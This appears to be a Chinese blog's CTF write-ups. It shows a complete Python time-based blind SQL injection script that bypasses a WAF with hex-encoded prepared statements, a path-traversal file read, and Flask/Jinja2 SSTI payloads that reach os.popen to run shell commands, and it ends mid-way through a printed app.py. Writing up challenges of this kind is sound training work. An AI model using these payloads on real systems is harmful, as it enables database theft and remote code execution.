&lt;p&gt;尝试  &lt;code&gt;1&#39;;show databases;&lt;/code&gt;  之类的操作，一直显示密码错误，猜测可能关键字被 waf 了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是 PDO），使用预编译 + 16 进制编码绕过 waf。&lt;/p&gt;
&lt;p&gt;而且页面不会根据我们输入情况回显不同，那么就用时间盲注；&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# by wh1sper
# 时间盲注
import requests
import time

host = &#39;http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login&#39;


def mid(bot, top):
    return (int)(0.5 * (top + bot))

def char_to_hex(str):
    res = &#39;&#39;
    for i in str:
        res += hex(ord(i))
    res = &#39;0x&#39; + res.replace(&#39;0x&#39;, &#39;&#39;)
    return res


def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = &#39;database()&#39;#---&amp;gt;ctf
            #babyselect = &#39;(select group_concat(table_name) &#39; \
            #             &#39;from information_schema.tables where table_schema=database())&#39;#---flag
            # babyselect = &#39;(select group_concat(column_name) &#39; \
            #             &#39;from information_schema.columns where table_name=&#39;flag&#39;)&#39;#---&amp;gt;flag
            babyselect = &#39;(select flag from flag)&#39;#---&amp;gt;glzjin_wants_a_girl_friend.zip
            select = &amp;quot;select if((ascii(substr(&amp;quot; +babyselect+ &amp;quot;,&amp;#123;&amp;#125;,1))&amp;gt; &amp;#123;&amp;#125;),sleep(3),1);&amp;quot;\
                .format(j, mid(bot, top))
            playload = &amp;quot;1&#39;;set @a=&amp;quot;+ char_to_hex(select) +&amp;quot;;PREPARE test from @a;execute test;&amp;quot;

            data = &amp;#123;
                &amp;quot;username&amp;quot;: playload,
                &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;
            &amp;#125;
            print(mid(bot, top))
            start_time = time.time()
            r = requests.post(url=host, json=data)
            end_tmie = time.time()
            #print(r.text)
            if end_tmie - start_time &amp;gt; 1.5:  # 成功
                if top - 1 == bot:  # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:  # 失败
                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到：glzjin_wants_a_girl_friend.zip&lt;/p&gt;
&lt;p&gt;然后看的出来是个文件，访问下载之，得到网站源码。 很明显，我们要通过某种方法将 flag.php 中的文件内容给读取出来。&lt;/p&gt;
&lt;p&gt;这是个 MVC 模型，首先了解一下该框架下 url 的解析过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从 r 参数中获取要访问的  &lt;code&gt;Controller&lt;/code&gt;  以及  &lt;code&gt;Action&lt;/code&gt;  , 然后以  &lt;code&gt;/&lt;/code&gt;  分隔开后拼接成完整的控制器名。 以  &lt;code&gt;Login/Index&lt;/code&gt;  为例，就是将  &lt;code&gt;Login/Index&lt;/code&gt;  分隔开分别拼接成  &lt;code&gt;LoginController&lt;/code&gt;  以及  &lt;code&gt;actionIndex&lt;/code&gt;  , 然后调用  &lt;code&gt;LoginController&lt;/code&gt;  这个类中的  &lt;code&gt;actionIndex&lt;/code&gt;  方法。每个  &lt;code&gt;action&lt;/code&gt;  里面会调用对应的  &lt;code&gt;loadView()&lt;/code&gt;  方法进行模版渲染，然后将页面返回给客户端。 若访问的  &lt;code&gt;Controller&lt;/code&gt;  不存在则默认解析  &lt;code&gt;Login/Index&lt;/code&gt;  。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这样我们就应该先来审计控制器的代码。&lt;/p&gt;
&lt;p&gt;不难发现，在 BaseController 中有着这么一段明显有问题的代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function loadView($viewName =&#39;&#39;, $viewData = [])
&amp;#123;
    $this-&amp;gt;viewPath = BASE_PATH . &amp;quot;/View/&amp;#123;$viewName&amp;#125;.php&amp;quot;;
    if(file_exists($this-&amp;gt;viewPath))
    &amp;#123;
        extract($viewData);
        include $this-&amp;gt;viewPath;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码中使用了  &lt;code&gt;extract()&lt;/code&gt;  ，以及包含了  &lt;code&gt;/View/&amp;#123;$viewName&amp;#125;.php&lt;/code&gt;  ，也就是说我们能通过  &lt;code&gt;$viewName&lt;/code&gt;  和  &lt;code&gt;$viewData&lt;/code&gt;  这两个变量来更改  &lt;code&gt;/View&lt;/code&gt;  下任何一个 php 文件的任何一个变量的值。&lt;/p&gt;
&lt;p&gt;在 UserController 中找到了以下代码:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function actionIndex()
&amp;#123;
    $listData = $_REQUEST;
    $this-&amp;gt;loadView(&#39;userIndex&#39;,$listData);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出来，其中  &lt;code&gt;$listData&lt;/code&gt;  是从请求中获取，用户可控，而其对应的  &lt;code&gt;/View/userIndex.php&lt;/code&gt;  中存在一个文件读取：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;fakeimg&amp;quot;&amp;gt;&amp;lt;?php
    if(!isset($img_file)) &amp;#123;
        $img_file = &#39;/../favicon.ico&#39;;
    &amp;#125;
    $img_dir = dirname(__FILE__) . $img_file;
    $img_base64 = imgToBase64($img_dir);
    echo &#39;&amp;lt;img src=&amp;quot;&#39; . $img_base64 . &#39;&amp;quot;&amp;gt;&#39;;       //图片形式展示
    ?&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中  &lt;code&gt;imgToBase64()&lt;/code&gt;  实现的是将目标文件转化成 base64 格式。而我们只需要将  &lt;code&gt;$img_file&lt;/code&gt;  改成  &lt;code&gt;/flag.php&lt;/code&gt;  即可。&lt;/p&gt;
&lt;p&gt;访问  &lt;code&gt;http://ip/index.php?r=User/Index&amp;amp;img_file=/../flag.php&lt;/code&gt;  即可获得 flag 的 base64&lt;/p&gt;
&lt;p 51ca227a-c6d5-4515-bed7-abdea8385e8a=&#34;&#34;&gt;flag&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL3N3cHUyMDE5LSVFNSVBNCU4RCVFNyU4RSVCMC8=&#34;&gt;https://blog.wh1sper.com/posts/swpu2019 - 复现 /&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;pasecactf_2019flask_ssti&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pasecactf_2019flask_ssti&#34;&gt;#&lt;/a&gt; [pasecactf_2019]flask_ssti&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;开局就是一个框，根据标题 ssti 直接&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;2*2&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接确定是 ssti&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;有很多限制（单引号’被过滤可以用双引号 &amp;quot; 代替；至于点。和下划线_被过滤可以采用 16 进制来表示，用&lt;a href=&#34;%E7%B1%BB%E4%BC%BC%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87&#34;&gt;&lt;/a&gt;的方式选定）&lt;/p&gt;
&lt;h4 id=&#34;用十六进制表示点和下划线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用十六进制表示点和下划线&#34;&gt;#&lt;/a&gt; 用十六进制表示点和下划线&lt;/h4&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;config[&#34;\x5f\x5fclass\x5f\x5f&#34;][&#34;\x5f\x5finit\x5f\x5f&#34;][&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;os&#34;][&#34;popen&#34;](&#34;whoami&#34;)[&#34;read&#34;]()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;可用直接 rce 了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;config[&#34;\x5f\x5fclass\x5f\x5f&#34;][&#34;\x5f\x5finit\x5f\x5f&#34;][&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;os&#34;][&#34;popen&#34;](&#34;ls /&#34;)[&#34;read&#34;]()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;没有 flag，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtd3cwZjYxemJqNmUucHk=&#34;&gt;那就找 app.py&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;config[&#34;\x5f\x5fclass\x5f\x5f&#34;][&#34;\x5f\x5finit\x5f\x5f&#34;][&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;os&#34;][&#34;popen&#34;](&#34;ls&#34;)[&#34;read&#34;]()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;cat &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; Flask&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; render_template_string&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; render_template&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; request&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Flask&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__name__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;config&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SECRET_KEY&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;folow @osminogka.ann on instagram =)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#Tiaonmmn don&#39;t remember to remove this part on deploy so nobody will solve that hehe&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;def encode(line, key, key2):&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; key2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/app/flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;config&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;flag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/app/flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nicknames &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;˜”*°★☆★_%s_★☆★°°*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%s ~♡ⓛⓞⓥⓔ♡~&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%s Вêчңø в øĤлâйĤé&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;♪ ♪ ♪ %s ♪ ♪ ♪ &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;[♥♥♥%s♥♥♥]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;♔%s♔&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;[♂+♂=♥]%s[♂+♂=♥]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; methods&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;method &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;nickname&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;nicknames&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token 